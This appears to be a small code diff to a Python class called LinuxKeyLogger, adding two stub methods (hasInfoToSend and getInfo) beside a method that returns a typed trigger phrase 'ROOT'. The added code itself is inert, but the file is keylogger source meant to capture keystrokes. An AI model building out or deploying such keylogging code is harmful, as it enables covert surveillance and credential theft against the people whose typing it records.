@@ -155,6 +155,12 @@ class LinuxKeyLogger(threading.Thread):
         """When this phrase is typed in a terminal will be created"""
         return "ROOT"
 
+    def hasInfoToSend(self):
+        return False
+
+    def getInfo(self):
+        return ''
+
 
 if __name__ == '__main__':
     keyL = LinuxKeyLogger()
